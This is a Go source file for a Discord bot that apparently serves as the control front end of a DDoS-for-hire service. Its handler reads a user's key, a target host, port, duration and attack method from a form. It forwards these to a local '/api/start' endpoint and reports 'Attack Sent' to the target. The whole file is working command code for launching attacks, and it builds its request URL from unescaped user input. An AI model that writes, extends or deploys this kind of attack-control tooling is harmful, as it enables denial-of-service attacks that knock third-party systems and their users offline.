package bot

import (
	"Manager/database"
	"github.com/bwmarrin/discordgo"
	"net/http"
	"strconv"
	"strings"
)

func AttackHandler(s *discordgo.Session, i *discordgo.InteractionCreate) {
	switch i.Type {
	case discordgo.InteractionModalSubmit:
		data := i.ModalSubmitData()
		if !strings.HasPrefix(data.CustomID, "attack_screen_") {
			return
		}
		if len(strings.Split(data.Components[0].(*discordgo.ActionsRow).Components[0].(*discordgo.TextInput).Value, "/")) != 2 {
			_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Content: "Please enter a valid username/key. (Case Sensitive)",
				},
			})
			return
		}
		Username := strings.Split(data.Components[0].(*discordgo.ActionsRow).Components[0].(*discordgo.TextInput).Value, "/")[0]
		Password := strings.Split(data.Components[0].(*discordgo.ActionsRow).Components[0].(*discordgo.TextInput).Value, "/")[1]
		Host := data.Components[1].(*discordgo.ActionsRow).Components[0].(*discordgo.TextInput).Value
		Port := data.Components[2].(*discordgo.ActionsRow).Components[0].(*discordgo.TextInput).Value
		Duration := data.Components[3].(*discordgo.ActionsRow).Components[0].(*discordgo.TextInput).Value
		Method := data.Components[4].(*discordgo.ActionsRow).Components[0].(*discordgo.TextInput).Value
		if !database.Authenticate(Username, Password) {
			_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Embeds: []*discordgo.MessageEmbed{
						{
							Title: "API Manager",
							Color: 5763719,
							Fields: []*discordgo.MessageEmbedField{
								{
									Name:  "**Failed to send Attack**",
									Value: "```Please check your input.```",
								},
							},
						},
					},
				},
			})
			return
		}
		resp, err := http.Get("http://localhost:" + strconv.Itoa(database.Config.Port) + "/api/start?username=" + Username + "&key=" + Password + "&host=" + Host + "&port=" + Port + "&time=" + Duration + "&method=" + Method)
		if database.CheckError(err) || resp.StatusCode != 200 {
			_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
				Type: discordgo.InteractionResponseChannelMessageWithSource,
				Data: &discordgo.InteractionResponseData{
					Embeds: []*discordgo.MessageEmbed{
						{
							Title: "API Manager",
							Color: 5763719,
							Fields: []*discordgo.MessageEmbedField{
								{
									Name:  "**Failed to send Attack**",
									Value: "```Please check your input.```",
								},
							},
						},
					},
				},
			})
			return
		}
		_ = s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Embeds: []*discordgo.MessageEmbed{
					{
						Title: "API Manager",
						Color: 5763719,
						Fields: []*discordgo.MessageEmbedField{
							{
								Name:  "**Attack Sent**",
								Value: "```Attack sent to " + Host + "```",
							},
						},
					},
				},
			},
		})
	}
}
